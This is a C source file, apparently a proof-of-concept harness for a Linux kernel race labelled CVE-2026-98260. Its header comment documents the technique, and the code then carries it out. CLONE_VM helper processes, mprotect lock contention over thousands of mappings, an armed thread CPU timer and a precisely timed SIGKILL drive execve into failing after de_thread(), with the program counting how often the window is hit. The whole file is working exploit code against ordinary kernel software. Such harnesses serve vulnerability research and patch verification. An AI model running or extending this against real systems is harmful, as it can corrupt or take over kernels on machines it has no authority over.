/*
 * CVE-2026-98260 window-entry harness, v3 — deterministic synchronisation.
 *
 * Technique (matches the upstream commit trace and the public research):
 *   1. killer is created with clone(CLONE_VM | SIGCHLD): a separate process
 *      sharing our address space, so de_thread() cannot reap it.
 *   2. killer polls tgkill(tgid, old_tid, 0) until it returns ESRCH. That is
 *      the exact moment de_thread() finished exchange_tids(): the TID the exec
 *      thread used to have no longer exists.
 *   3. killer then sends SIGKILL to the whole thread group, so the exec thread
 *      sees a fatal signal at exec_mmap()'s mmap_read_lock_killable() and the
 *      exec fails with -EINTR *after* the point of no return.
 *   4. lockers (also clone(CLONE_VM|SIGCHLD)) hammer mprotect over a large
 *      fragmented VMA range to hold/contend mmap_lock and widen the window.
 *
 * A per-thread POSIX CPU timer (CLOCK_THREAD_CPUTIME_ID) is armed on the exec
 * thread before execve, so its node is queued in that task's posix_cputimers
 * when de_thread() moves the PID away.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#define NVMA_DEFAULT 50000
#define STACKSZ (1U << 20)

static volatile int g_tid;        /* exec thread's tid, published pre-exec */
static volatile int g_golock;     /* lockers may start */
static volatile int g_injail;     /* lockers inside mprotect */
static volatile int g_stop;
static void *g_base;
static size_t g_len;
static int g_verbose = 1;

static int locker_fn(void *arg) {
    (void)arg;
    int prot = PROT_NONE;
    while (!g_golock) {
        if (g_stop) return 0;
        sched_yield();
    }
    while (!g_stop) {
        g_injail = 1;
        mprotect(g_base, g_len, prot);
        g_injail = 0;
        prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE;
    }
    return 0;
}

static int killer_fn(void *arg) {
    int tgid = (int)(long)arg;
    int old;

    while (!(old = g_tid)) {
        if (g_stop) return 0;
        sched_yield();
    }
    if (g_verbose) dprintf(2, "[killer] watching tgid=%d tid=%d\n", tgid, old);

    /* Wait for de_thread() to move the PID away from this TID. */
    for (;;) {
        long rc = syscall(SYS_tgkill, tgid, old, 0);
        if (rc < 0 && errno == ESRCH) break;
        if (g_stop) return 0;
        sched_yield();
    }
    if (g_verbose) dprintf(2, "[killer] old tid gone -> group SIGKILL\n");
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    return 0;
}

static void *exec_fn(void *arg) {
    struct sigevent ev;
    struct itimerspec spec;
    timer_t t;
    char *const argv[] = { (char *)"harness", (char *)"--exec-ok", NULL };
    (void)arg;

    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGRTMIN;
    if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &t)) _exit(120);
    memset(&spec, 0, sizeof(spec));
    spec.it_value.tv_sec = 3600;         /* stays armed across de_thread() */
    if (timer_settime(t, 0, &spec, NULL)) _exit(121);

    g_tid = (int)syscall(SYS_gettid);
    __sync_synchronize();
    g_golock = 1;

    /* Let a locker get into mprotect() so exec_mmap() has to wait on it.
     * No extra spin here: we want execve() to reach mmap_read_lock_killable()
     * while the lock is still held. */
    while (!g_injail) sched_yield();

    execve("/proc/self/exe", argv, (char *const[]){ NULL });
    _exit(122);   /* only if execve returned (window hit) */
}

static int spawn_sharing(int (*fn)(void *), void *arg) {
    void *stack = mmap(NULL, STACKSZ, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if (stack == MAP_FAILED) return -1;
    /* CLONE_VM without CLONE_THREAD: separate process, same address space. */
    int pid = clone(fn, (char *)stack + STACKSZ, CLONE_VM | SIGCHLD, arg);
    if (pid < 0) munmap(stack, STACKSZ);
    return pid;
}

static int prepare_vmas(int nvma) {
    long page = sysconf(_SC_PAGESIZE);
    int fd = (int)syscall(SYS_memfd_create, "ballast", MFD_CLOEXEC);
    if (fd < 0 || ftruncate(fd, page)) return -1;
    g_len = (size_t)nvma * (size_t)page;
    g_base = mmap(NULL, g_len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_base == MAP_FAILED) { close(fd); return -1; }
    for (int i = 0; i < nvma; i++) {
        void *at = (char *)g_base + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at) {
            close(fd);
            return -1;
        }
    }
    close(fd);
    return 0;
}

static void child_race(int nvma, int nlocker) {
    pthread_t th;
    sigset_t blk;

    if (prepare_vmas(nvma)) _exit(110);
    for (int i = 0; i < nlocker; i++)
        if (spawn_sharing(locker_fn, NULL) < 0) _exit(111);
    if (spawn_sharing(killer_fn, (void *)(long)getpid()) < 0) _exit(112);

    sigemptyset(&blk);
    sigaddset(&blk, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &blk, NULL);

    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(113);
    for (;;) sched_yield();
}

int main(int argc, char **argv) {
    int iters = 50, nvma = NVMA_DEFAULT, nlocker = 3, quiet = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--exec-ok")) return 0;      /* re-exec landed */
        else if (!strcmp(argv[i], "--iters") && i + 1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--nvma") && i + 1 < argc) nvma = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--lockers") && i + 1 < argc) nlocker = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--quiet")) quiet = 1;
        else { fprintf(stderr, "bad arg %s\n", argv[i]); return 2; }
    }
    g_verbose = !quiet;

    printf("[*] v3 race: iters=%d nvma=%d lockers=%d uid=%d\n",
           iters, nvma, nlocker, (int)getuid());
    fflush(stdout);

    int killed = 0, exited = 0, timeout = 0, died_other = 0, window = 0;
    for (int it = 0; it < iters; it++) {
        pid_t pid = fork();
        if (pid == 0) child_race(nvma, nlocker);
        if (pid < 0) { perror("fork"); return 3; }

        int st = 0, waited = 0, reaped = 0;
        while (waited < 3000) {                     /* <= 3s per attempt */
            pid_t r = waitpid(pid, &st, WNOHANG);
            if (r == pid) { reaped = 1; break; }
            usleep(1000);
            waited++;
        }
        if (!reaped) {
            kill(pid, SIGKILL);
            waitpid(pid, &st, 0);
            timeout++;
        } else if (WIFSIGNALED(st) && WTERMSIG(st) == SIGKILL) {
            killed++;
        } else if (WIFEXITED(st)) {
            if (WEXITSTATUS(st) == 0) exited++;          /* exec landed */
            else if (WEXITSTATUS(st) == 122) window++;   /* execve returned */
            else died_other++;
        } else died_other++;

        if ((it + 1) % 10 == 0) {
            printf("[*] %d/%d killed=%d exec_ok=%d window=%d timeout=%d other=%d\n",
                   it + 1, iters, killed, exited, window, timeout, died_other);
            fflush(stdout);
        }
    }
    printf("[*] done killed=%d exec_ok=%d window=%d timeout=%d other=%d\n",
           killed, exited, window, timeout, died_other);
    return 0;
}
